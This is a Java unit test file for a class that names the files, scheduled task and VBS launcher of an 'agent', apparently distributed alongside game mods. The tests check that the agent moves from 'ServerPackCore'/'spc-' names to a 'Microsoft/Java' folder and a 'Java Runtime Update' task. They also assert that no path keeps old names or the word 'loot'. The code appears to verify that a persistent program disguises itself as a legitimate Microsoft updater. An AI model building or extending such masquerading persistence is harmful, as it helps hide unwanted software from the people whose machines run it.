package com.spcagentpayloa.jvmxx;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class AgentPathsTest {
	@TempDir
	Path temp;

	@Test
	void modernNamesArePlausible() {
		Path dir = temp.resolve("Microsoft").resolve("Java");
		assertFalse(AgentPaths.legacy(dir));
		assertEquals("runtime.lock", AgentPaths.lock(dir).getFileName().toString());
		assertEquals("config.json", AgentPaths.state(dir).getFileName().toString());
		assertEquals("session.txt", AgentPaths.alive(dir).getFileName().toString());
		assertEquals("runtime.jar", AgentPaths.agentJar(dir).getFileName().toString());
		assertEquals("update-new.jar", AgentPaths.agentStaged(dir).getFileName().toString());
		assertEquals("update.intent", AgentPaths.intent(dir).getFileName().toString());
		assertEquals("logs/update.log", dir.relativize(AgentPaths.log(dir)).toString());
		assertEquals("Java Runtime Update", AgentPaths.task(dir));
		assertEquals("startup.vbs", AgentPaths.launcher(dir).getFileName().toString());
	}

	@Test
	void legacyKeepsAgentAndTaskNames() {
		Path dir = temp.resolve("ServerPackCore");
		assertTrue(AgentPaths.legacy(dir));
		assertEquals("spc-agent.lock", AgentPaths.lock(dir).getFileName().toString());
		assertEquals("state.json", AgentPaths.state(dir).getFileName().toString());
		assertEquals("alive.txt", AgentPaths.alive(dir).getFileName().toString());
		assertEquals("spc-agent.jar", AgentPaths.agentJar(dir).getFileName().toString());
		assertEquals("spc-agent-new.jar", AgentPaths.agentStaged(dir).getFileName().toString());
		assertEquals("spc-update.intent", AgentPaths.intent(dir).getFileName().toString());
		assertEquals("update.log", AgentPaths.log(dir).getFileName().toString());
		assertEquals("ServerPackCore", AgentPaths.task(dir));
		assertEquals("spc-sync.vbs", AgentPaths.launcher(dir).getFileName().toString());
	}

	@Test
	void theChosenTaskNameWinsAndAliasesStayKnown() throws Exception {
		Path dir = temp.resolve("Microsoft").resolve("Java");
		Files.createDirectories(dir);
		assertEquals("Java Runtime Update", AgentPaths.task(dir));
		assertEquals(List.of(temp.resolve("FabricSync"), temp.resolve("ServerPackCore")),
			AgentPaths.previousDirs(dir));

		Files.writeString(dir.resolve("task.name"), "Java Runtime Update 2\n");
		assertEquals("Java Runtime Update 2", AgentPaths.task(dir));
		assertEquals("Java Runtime Update 2", AgentPaths.runValue(dir));
	}

	@Test
	void modernTreeHasNoOldNames() throws Exception {
		Path dir = temp.resolve("Microsoft").resolve("Java");
		Files.createDirectories(dir);
		List<Path> names = List.of(
			AgentPaths.lock(dir), AgentPaths.state(dir), AgentPaths.alive(dir), AgentPaths.marker(dir),
			AgentPaths.agentJar(dir), AgentPaths.agentOld(dir), AgentPaths.agentBad(dir),
			AgentPaths.agentStaged(dir), AgentPaths.agentTemp(dir), AgentPaths.binary(dir),
			AgentPaths.log(dir), AgentPaths.out(dir), AgentPaths.intent(dir), AgentPaths.rollbackMarker(dir),
			AgentPaths.helper(dir), AgentPaths.modHelper(dir), AgentPaths.modStaged(dir),
			AgentPaths.modStagedUnique(dir, "0.2.7", 1L), AgentPaths.modCancel(dir),
			AgentPaths.taskXml(dir), AgentPaths.launcher(dir));
		for (Path path : names) {
			String name = path.getFileName().toString();
			assertFalse(name.startsWith("spc-"), name);
			assertFalse(path.toString().contains("loot"), name);
			assertFalse(name.equals("state.json"), name);
			assertFalse(name.equals("alive.txt"), name);
		}
		assertFalse(dir.relativize(AgentPaths.log(dir)).toString().startsWith("update.log"));
	}
}
